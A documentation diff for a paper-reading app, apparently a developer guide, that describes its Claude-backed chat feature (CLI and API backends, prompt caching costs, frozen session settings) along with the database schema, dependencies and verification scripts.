+**Model and cost.** `claude-opus-5` at `--effort medium` (Opus 5 is unusually strong at lower effort, and this is reading comprehension, not proof search). The old `max_tokens: 2048` is gone: on the API path it had to rise to 16000, because adaptive thinking is on by default on Opus 5 and `max_tokens` bounds thinking + output *together*; the CLI has no such flag.
+
+**Measured end-to-end** on `1706.03762` (2026-08-29, CLI backend): the prefix is **21,301 tokens** — the 17,291 of distilled source plus the frozen prompt and the CLI's own preamble, against 34,820 for the base64 PDF. A cold prime costs **$0.236**; a resumed turn reads all 21,301 from cache and writes only **355** new ones, at **$0.018**, in 3.2 s with the first token at 1.9 s. A *fresh session on the same paper* also read the full 21,301 from cache ($0.035), because the 1-hour cache is shared across invocations by prefix — reopening a paper within the hour is nearly free. Estimated ten-message session: **≈ $0.40**, against ≈ $1.40 for the old Sonnet-4 + PDF + 5-minute path at realistic pacing. Fire ten messages inside five minutes and the old path was cheaper; the realistic case is pauses, which is what the 1-hour cache covers. Costs are shown per message, prefixed `≈` on the CLI backend where the figure is the **list-price equivalent** of plan-billed work, not money charged to an API account.
+
+**Settings** (server-side, mirroring `scoutBackend`): `chatBackend` (`cli` default), `chatModel` (`claude-opus-5`), `chatEffort` (`medium`), `chatContextMode` (`tex`). These affect **new sessions only** — an existing session keeps the model, backend and prompt it was created with, or the resume breaks. `GET /api/chat/backend-status` reports whether this machine can answer at all (`claude --version` + `claude auth status`, both local and free); on the `cli` backend the Settings panel and the chat gate check *that* instead of an API key.
+
+**The `api` backend** is the fallback for a headless deploy with no CLI, or when messages should bill to an API account. It has no session store, so it re-sends the paper and the transcript every turn with an ephemeral breakpoint on the system prompt — a 5-minute TTL, which is exactly what the CLI path exists to escape. It streams too, via the Anthropic streaming API.
+
+**Verification:** `npm run verify:chat --prefix server` — 93 checks over an isolated temp data dir, no network, no model. The load-bearing one asserts the prime and resume vectors **differ only in `--session-id` vs `--resume`**, which is the prefix-identity rule mechanized. Also: prompt-freezing determinism and that a worldline change after creation cannot alter the stored prompt, the context fallback chain including `upload-*` forcing `pdf`, NDJSON framing (document block for `pdf`, text for `tex`, **no `cache_control` anywhere**), transcript-replay truncation, result-event parsing (usage, per-invocation cost, `is_error` and non-success subtypes), cost accounting, the CLAUDE.md-ancestor guard on the CLI cwd, the session sweep's keep-list, and migration idempotency.
+
 ### Database Schema (`server/data/papers.db`)
 
-SQLite database created at runtime. 14 tables with cascade deletion:
+SQLite database created at runtime. 15 tables with cascade deletion:
 
 | Table | Key Columns | Constraints |
 | --- | --- | --- |
@@ -235,28 +406,29 @@ SQLite database created at runtime. 14 tables with cascade deletion:
 | `favorite_authors` | id, name, added_at | name UNIQUE |
 | `worldlines` | id, name, color, created_at | — |
 | `worldline_papers` | worldline_id, paper_id, position | Composite PK, both FK CASCADE |
-| `chat_sessions` | id, arxiv_id, paper_title, worldline_id, session_type, created_at, updated_at | session_type CHECK ('paper','worldline') |
+| `chat_sessions` | id, arxiv_id, paper_title, worldline_id, session_type, created_at, updated_at, **cli_session_id, context_mode, system_prompt, backend, model** | session_type CHECK ('paper','worldline'); the last five are frozen at the session's first message (see Chat) |
 | `chat_messages` | id, session_id, role, content, token_usage, created_at | FK→chat_sessions CASCADE |
 | `settings` | key, value | key PRIMARY KEY (UNIQUE) |
 | `paper_embeddings` | arxiv_id, embedding, model_version, created_at | arxiv_id PRIMARY KEY |
 | `flag_log` | id, arxiv_id, worldline_id, score, runner_up_score, margin, corroboration_kind, category, flagged_at, accepted, decided_at | UNIQUE(arxiv_id, worldline_id), FK→worldlines CASCADE |
 | `scout_runs` | id, cache_key, category, scanned_ids, paper_count, library_fingerprint, model, backend, findings, token counts, estimated_cost, created_at | cache_key UNIQUE (upserted on forced rescan) |
 | `paper_archive` | arxiv_id, title, summary, authors, categories, published, tier, tags, worldlines, first_saved_at, removed_at, disposition | arxiv_id PRIMARY KEY, disposition CHECK ('library','scribe','removed'), **no FK — it outlives the paper row** |
+| `walkthroughs` | id, arxiv_id, source_version, source_sha, contract_version, cache_key, status, fitness, outline, bundle_path, warnings, model, backend, token counts, outline_cost, build_cost, estimated_cost, error | cache_key UNIQUE, status CHECK ('pending','building','ready','failed','unfit'), **no FK — it outlives the paper row** |
 
-Indices on: `papers.arxiv_id`, `comments.paper_id`, `paper_tags.paper_id`, `paper_tags.tag_id`, `worldline_papers.worldline_id`, `worldline_papers.paper_id`, `chat_sessions.arxiv_id`, `chat_sessions.worldline_id`, `chat_sessions.session_type`, `paper_embeddings.model_version`, `flag_log.worldline_id`, `flag_log.category`, `flag_log.accepted`, `scout_runs.created_at`, `paper_archive.removed_at`.
+Indices on: `papers.arxiv_id`, `comments.paper_id`, `paper_tags.paper_id`, `paper_tags.tag_id`, `worldline_papers.worldline_id`, `worldline_papers.paper_id`, `chat_sessions.arxiv_id`, `chat_sessions.worldline_id`, `chat_sessions.session_type`, `paper_embeddings.model_version`, `flag_log.worldline_id`, `flag_log.category`, `flag_log.accepted`, `scout_runs.created_at`, `paper_archive.removed_at`, `walkthroughs.arxiv_id`, `walkthroughs.status`.
 
 ### Storage Split
 
 **Important:** The project was originally client-side only, storing everything in localStorage. Most data has since been migrated server-side. Do not introduce new localStorage keys for persistent data — use the server-side settings or database instead.
 
-* **Server-side (SQLite)**: Papers, comments, tags, authors, worldlines, chat sessions + messages, settings (Claude API key, similarity threshold, Scout backend, PDF trim mode), paper embeddings, worldline flag log, Scout runs, the ever-saved paper ledger
+* **Server-side (SQLite)**: Papers, comments, tags, authors, worldlines, chat sessions + messages (plus each session's frozen prompt, model, backend and CLI session id), settings (Claude API key, similarity threshold, Scout backend, chat backend/model/effort/context mode, PDF trim mode, walkthrough backend/budget/effort), paper embeddings, worldline flag log, Scout runs, the ever-saved paper ledger, walkthroughs
 * **Client-side (localStorage)**: Only visual preferences that affect rendering before API loads — color scheme and card font size (`paperpile-navigate-visual-prefs`)
 
 ## Key Dependencies
 
 **Frontend:** React 18.3, Vite 6, TypeScript 5.7, react-pdf 9.1, react-markdown 10.1, better-react-mathjax 2.4, d3 7.9
 
-**Backend:** Express 4.21, TypeScript 5.7, better-sqlite3 11.7, xml2js 0.6, cors 2.8, @huggingface/transformers (tokenizer + all-MiniLM fallback), onnxruntime-node 1.21 (SPECTER2 ONNX inference), tsx 4.19 (dev)
+**Backend:** Express 4.21, TypeScript 5.7, better-sqlite3 11.7, xml2js 0.6, cors 2.8, @huggingface/transformers (tokenizer + all-MiniLM fallback), onnxruntime-node 1.21 (SPECTER2 ONNX inference), three 0.185 + **mathjax 3.2** (vendored *only* to be served into walkthrough bundles — never imported by the server; mathjax is pinned to v3 because v4 lazy-loads fonts from a CDN, see Walkthrough Mode), tsx 4.19 (dev)
 
 ## Conventions
 
@@ -298,7 +470,9 @@ Targeted verification harnesses live in `server/scripts/` and run against isolat
 npm run verify:similarity --prefix server   # similarity-core decision logic + flag log
 npm run verify:specter2   --prefix server   # loads the embedding model (the one gate that needs it)
 npm run verify:scout      --prefix server   # Scout scan-key identity, fingerprint, ever-saved ledger, run store, output normalization
+npm run verify:chat       --prefix server   # chat flag-vector symmetry, frozen prompts, context fallback, NDJSON framing, session reaping
 npm run verify:autotrim   --prefix server   # margin detection + document-box aggregation (client code, synthetic pages)
+npm run verify:walkthrough --prefix server  # TeX acquisition/distillation, tar path safety, outline + build cache keys, bundle scanner
 ```
 
 `verify:autotrim` is the exception to "harnesses live server-side": it exercises `client/src/utils/autoTrim.ts`, which is pure and DOM-free in the parts that matter, and `server/`'s tsconfig only compiles `src/**`, so importing across the boundary from `scripts/` costs the server build nothing.
